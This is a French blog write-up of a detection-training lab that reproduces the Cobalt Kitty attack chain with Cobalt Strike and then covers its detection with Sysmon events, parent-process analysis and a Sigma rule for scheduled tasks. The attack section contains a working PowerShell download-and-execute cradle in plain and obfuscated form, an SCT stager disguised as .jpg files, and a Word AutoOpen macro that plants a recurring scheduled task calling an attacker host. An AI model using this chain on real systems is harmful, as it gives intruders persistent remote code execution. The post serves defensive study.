---
layout: post
title: Attack Detection Fundamentals - Initial Access Lab 3
subtitle: Workshop de F-Secure - Utilisation de Cobalt Strike
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [Cobalt Kitty, Cobalt Strike, PowerShell, Word, Macro, VBA, Windows, Mshta, Fileless attack, Red Team, Blue Team, Beacon, C2, Obfuscation, Invoke-Obfuscation, SCT, Sysmon, PPID, LOLBin, Schtasks, Sigma]
---

![d18894b98f1427909964d9d9f8cc8656.png](/img/1d0286fba5f74365a7b3fa4931af8edd.png){: .center-block :}

Dans les deux premiers labs, nous avons vu deux méthodes de détection d'attaque: l'analyse parent-enfant (PPID) et l'analyse des connections. Ces labs nous ont permis d'utiliser des C2 frameworks, Covenant et Koadic, et de voir des méthodes d'évasion (PPID spoofing et mshta).

- [Attack Detection Fundamentals - Initial Access - Lab1](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-1/){:target="_blank"}
- [Attack Detection Fundamentals - Initial Access - Lab2](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-2/){:target="_blank"}

Dans ce troisième lab de la série *Initial Access* du workshop *Attack Detection Fundamentals* nous allons reproduire les vecteurs d'attaque de Cobalt Kitty [1]

***Operation Cobalt Kitty** is an example of a fileless attack that used malicious PowerShell to target an Asian corporation for almost 6 months. A spear-phishing email was used to infiltrate more than 40 PCs and server* [2]

**Fileless attack:** Un programme malveillant entièrement sans fichiers peut être considéré comme un logiciel malveillant qui n’exige jamais l’écriture d’un fichier sur le disque. [3]

Nous verrons lors de la phase d'analyse que l'opération Cobalt Kitty est détectable grace à l'analyse PPID et l'analyse des connections réseau des processus.

**Étapes de l'attaque:** Nous créerons une macro Word pour générer une tâche planifiée (scheduled task) qui utilise "mshta.exe" afin d'éxécuter un script externe. Ce script téléchargera et exécutera un second stager qui injectera finalement une balise Cobalt Strike en mémoire à l'aide de PowerShell.

![dfb0a050c9c092b6a8554518d9d0417a.png](/img/9096e8f525114c98bc8bd2395d074c92.png)
*Source: [1]*

![4266a464a4e817ee8b8a39207cd267d7.png](/img/f536aff1772342fb9c19a62991a61798.png)
*Source: [4][5]*

Cobalt Strike est un outil développé pour les équipes red team mais est ausssi utilisé par plusieurs groupes APT. Voir [6]

***Cobalt Strike** gives you a post-exploitation agent and covert channels to emulate a quiet long-term embedded actor in your customer's network* [7]

![2fd0b8c4d59aa54682afbef25086f26c.png](/img/a049ef69718444d2bb4c0275d48cbdbe.png)
*Source: [8]*

**HTTP Beacon**

![ab1fb01f307c0f9e90cb774eaf2df949.png](/img/d59fa6de60204f3e8519e8a50faffd13.png)

Ref: [9][10]11]

1. Lancer le serveur Cobalt Strike (team server)

![03c2d824b4a26dbd234c6d3e3aa81f2e.png](/img/32e17b6bb902479badaae2e26876606c.png)

2. Lancer le client: `./start.sh`

Se connecter au serveur

![d18f032b7dfca664a3b48daef833184c.png](/img/067931f65b4b436794a59c399a136da3.png)

3. Création d'un listener

`Configure Listeners > Add`

![35da084b8f45d0b10a7839494cab34ce.png](/img/2397a711bf8a4122a3df6a36cbf34cff.png)

![8805343ec0b5f87ad6375e3a1488fc73.png](/img/ac4a9c7d25bf4afbb2d4ff0f88dc5dff.png)

4. Création du payload

`Setup Scripted Web-Delivery (stageless`)

![a2637ef6703fdaef15172be651951845.png](/img/7c1aa645a18a413ca361f29e45e83dd9.png)

Génère un script et l'hébèrge sur le serveur

![9b0add32b96263be20c33de49ea013a2.png](/img/340d54c3572844928ea6be70afbea7e1.png)

![f81cdba0f62d2907f7916673ab0106c0.png](/img/20b3834c15124fa19736415e9932de50.png)

Download un script PowerShell et l'exécute en mémoire comme c'était le cas pour le [lab 1.](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-1/){:target="_blank"}

5. Offuscation:

***Invoke-Obfuscation** is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.*

Installer Powershell sur Ubuntu: [https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7){:target="_blank"}

![5eef5c85a47e63221c9a4d15831039fc.png](/img/08111477dc5146fa95262877acb0dd9d.png)

`set SCRIPTBLOCK IEX ((new-object net.webclient).downloadstring('http://192.168.1.94:80/a'))`

![4786bc9669113a27c2ed8614a6d32b46.png](/img/df80a3d22810499eb5ab316ac60b7f5f.png)

![98a3a7aae360348375cd3e4d00811642.png](/img/941eba218d6f48bfb5468c71a6499cd1.png)

`TOKEN` puis `ALL`

![cc061145f9b2f44246a496bb37354fab.png](/img/690d8dd319d24f7d9397dc3502bba7e7.png)

`1`

![1310536f1b23bd1d887ed6914d36e9ac.png](/img/66fa555b375249fa9b3b7301d4bfaf88.png)

**Payload:** `&("{1}{0}"-f'EX','I') ((&("{1}{0}{2}"-f 'w-obj','ne','ect') ("{3}{0}{2}{1}" -f'et.web','ent','cli','n')).("{1}{0}{3}{2}" -f 'nloads','dow','ring','t').Invoke(("{0}{1}{4}{3}{2}"-f'http://192.1','68.1.94:','a','/','80')))`

Enregistrer le payload dans un fichier nommé `microsoft.jpg`

![bdef5d195c0947fc1d9e29c3545288b5.png](/img/911b3d0ac5254ff8abb15ac406e2861d.png)

Héberger ce fichier sur le serveur Cobalt Strike /updates/microsoft.jpg

`Host a file`

![8bed5e015386aac5b90e3a5735c4dd8b.png](/img/665c32ab25d7486fa043601be40d5337.png)

Penser à mettre le MIME TYPE à text/plain

![f9d760f78825f8cf514b9cd6f4fcd6d1.png](/img/7c0947c28d014a7b8edb537260e3e896.png)

6. Fichier SCT 

La prochaine étape du processus est la création d'un fichier SCT qui sera utilisé pour exécuter le payload PowerShell que nous venons de construire.

Nous nous inspirons de ce PoC pour construire notre stagger: [https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019](https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019){:target="_blank"}

Enregistrer le script suivant sous `microsoftftp.jpg`

```
<?XML version="1.0"?>
<scriptlet>
    <registration description="Bandit" progid="Bandit" version="1.00" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
        <!-- Proof Of Concept - Casey Smith @subTee -->
        <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
        <script language="JScript">
            <![CDATA[
                var r = new ActiveXObject("WScript.Shell").Run("powershell.exe iex (iwr 'http://192.168.1.94:80/updates/microsoft.jpg')");
            ]]>
        </script>
    </registration>

    <public>
        <method name="Exec"></method>
    </public>
    <script language="JScript">
        <![CDATA[
            function Exec()
            {
                var r = new ActiveXObject("WScript.Shell").Run("powershell.exe iex (iwr 'http://192.168.1.94:80/updates/microsoft.jpg')");
            }
        ]]>
    </script>
</scriptlet>
```

Héberger le fichier sur le serveur Cobalt Strike: `/updates/microsoftftp.jpg`

![7a55546d56f094731560e9ff2c0c4718.png](/img/7a0ca747da7e4562b8be7c2ccaf3cfd9.png)

7. Macro Word

La dernière étape consiste à créer une macro VBA malicieuse dans un doc Word. Cette macro créera une tache planifiée qui déclanchera les étapes que nous avons construit précédemment

Code:

```
Sub AutoOpen()
	Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting"" /tr ""mshta.exe javascript:a=GetObject('script:http://192.168.1.94:80/updates/microsoftftp.jpg').Exec();close();"" /mo 15 /F")
End Sub
```

![9b1f2a0feaffb79880ef025588a05eb9.png](/img/88ea0d54434a496aad9d4722f432c9ab.png)

Lancer la macro

On obtient une connection dans Cobalt Strike

![5c3d74f8c42ff055062983bc4cbf0633.png](/img/80fd8335d6f741529a82526bea4f60ef.png)

# Analyse

Les événements Sysmon montrent les étapes suivantes:

1. Création d'une tâche: LOL bin schtasks.exe [12]

![daaf000611d1ed870a4c5b2cf6888145.png](/img/e3816b59f4cb44e18e3174c59c4c78d0.png)

Cette tâche est engendrée par WINWORD.EXE (PPID)

Dans Task Scheduler on observe bien qu'une nouvelle tâche a été créée

![521484b4ffccb718b30962b40020085a.png](/img/c1c178a4a3414120a6f6f9661431b66f.png)

Lancer la tache sinon il faut attendre 15 min...

Sysmon:

![e4bc549390b8a902272b5db8f8f3b913.png](/img/722c95ac6ba647a988805eb497ffb5b1.png)

2. Creation du LOL Bin Mshta - Event id 1

![1affa71289c9f240bb85fef5e0d3c2ec.png](/img/c96cc995d7844b3ba58a0a37a30ca710.png)

*Used by Windows to execute html applications. (.hta)* [13]

Déjà vu dans Lab 2. Technique d'évasion

3. Connection réseau Mshta - Event id 3

![ae8080972d78c075826d958ed5cdc970.png](/img/96df0a7f49194d249b258fa1fa81c8f7.png)

2. Création de Powershell - Event id 1

![d9a2177e92b27caeaf9733f03ff43665.png](/img/351d1c0a10ac496d8807e0f58502d538.png)

Parent: mshta.exe

**Règle Sigma pour détecter la création de tâche:**

Nous allons utiliser la règle `/rules/windows/builtin/win_rare_schtasks_creations.yml` de Sigma. Cette règle utilise les logs Security de Windows

![86e53514170ed7d1257a2d6f4b4913d0.png](/img/5b22b1ff0ab34f059c3d5804c3d57b10.png)

/!\ Activer les logs liés au task scheduler dans Security [14]:

`Local Group Policy Editor > Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > System Audit Policies > Object Access > Audit Other Object Access Events`

Configurer

![4507828f7c02606af8581a24b2f67546.png](/img/c3fd21f894414c5f9c1e0f021197e3a3.png)

Génération de la règle Sigma `/rules/windows/builtin/win_rare_schtasks_creations.yml` en powershell (Au besoin voir [lab 1](https://0xss0rz.github.io/2021-01-04-Attack-Detection-Initial-Access-1/){:target="_blank"})

![ddb0ca5b70122bca4d203cfb6e1ad8b4.png](/img/a82a0e1a357b4df2bef78780910e4d30.png)

Event id 4698 = *A scheduled task was created* [15] 

Test:

![413d4a1bc1ce62f146381a2324b47581.png](/img/9b8adf656e624b6981ca96a0c307ae4b.png)

L'activité liée au task scheduler est aussi loguée ici:

`Event Viewer > Applications and Services Logs > Microsoft > Windows > TaskScheduler > Operational`

Pour vérifier que les logs sont activés:

Clic droit -> Properties. Enable logging

![379dc7ecb0be1fcd18312d19ecf5a2d9.png](/img/ff571a32ae1f4269b90e8ffaf4f090c5.png)

# Conclusion

Nous avons reproduit les étapes utilisées lors de l'opération Cobalt Kitty. Bien que cette attaque soit *fileless*, il est possible de la détecter à l'aide de l'analyse PPID et des connections réseau.

# Références

[1] F-Secure, *Attack Detection Fundamentals: Initial Access - Lab #3*, [https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-3](https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-3){:target="_blank"}

[2] Norton, *What is fileless malware and how does it work?*, [https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html](https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html){:target="_blank"}

[3] Microsoft, *Menaces fileless*, [https://docs.microsoft.com/fr-fr/windows/security/threat-protection/intelligence/fileless-threats](https://docs.microsoft.com/fr-fr/windows/security/threat-protection/intelligence/fileless-threats){:target="_blank"}

[4] Cybereason, *Operation Cobalt Kitty: A large-scale APT in Asia carried out by the OceanLotus Group*, [https://www.cybereason.com/blog/operation-cobalt-kitty-apt](https://www.cybereason.com/blog/operation-cobalt-kitty-apt){:target="_blank"}

[5] Cybereason, *Operation Cobalt Kitty
Cybereason Labs Analysis*, [https://attack.mitre.org/docs/training-cti/Cybereason%20Cobalt%20Kitty%20-%20answers.pdf](https://attack.mitre.org/docs/training-cti/Cybereason%20Cobalt%20Kitty%20-%20answers.pdf){:target="_blank"}

[6] MalwareBytes Labs, *Multi-stage APT attack drops Cobalt Strike using Malleable C2 feature*, [https://blog.malwarebytes.com/threat-analysis/2020/06/multi-stage-apt-attack-drops-cobalt-strike-using-malleable-c2-feature/](https://blog.malwarebytes.com/threat-analysis/2020/06/multi-stage-apt-attack-drops-cobalt-strike-using-malleable-c2-feature/){:target="_blank"}

[7] CobaltStrike, [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/){:target="_blank"}

[8] Aldeid, *Cobalt Strike*, [https://www.aldeid.com/wiki/Cobalt-Strike](https://www.aldeid.com/wiki/Cobalt-Strike){:target="_blank"}

[9] Red Team Experiments, *Cobalt Strike 101*, [https://www.ired.team/offensive-security/red-team-infrastructure/cobalt-strike-101-installation-and-interesting-commands](https://www.ired.team/offensive-security/red-team-infrastructure/cobalt-strike-101-installation-and-interesting-commands){:target="_blank"}

[10] *Introduction to Cobalt Strike*, [https://securityonline.info/introduction-cobalt-strike/](https://securityonline.info/introduction-cobalt-strike/){:target="_blank"}

[11] Daniel Bohannon, *The Invoke-Obfuscation Usage Guide :: Part 1*, [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide){:target="_blank"}

[12] LOLBAS, *Schtasks*, [https://lolbas-project.github.io/lolbas/Binaries/Schtasks/](https://lolbas-project.github.io/lolbas/Binaries/Schtasks/){:target="_blank"}

[13] LOLBAS, *Mshta*, [https://lolbas-project.github.io/lolbas/Binaries/Mshta/](https://lolbas-project.github.io/lolbas/Binaries/Mshta/){:target="_blank"}

[14] CSO, *How to audit Windows Task Scheduler for cyber-attack activity*, [https://www.csoonline.com/article/3373498/how-to-audit-windows-task-scheduler-for-cyber-attack-activity.html](https://www.csoonline.com/article/3373498/how-to-audit-windows-task-scheduler-for-cyber-attack-activity.html){:target="_blank"}

[15] Microsoft, *4698(S): A scheduled task was created*, [https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698){:target="_blank"}

**Poursuivez avec :** 

- [SSH Port Forwarding - Cheat Sheet](https://0xss0rz.github.io/2020-11-21-SSH-Tunneling/)

- [Hack The Box - Cache](https://0xss0rz.github.io/2020-11-18-HTB-Cache/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
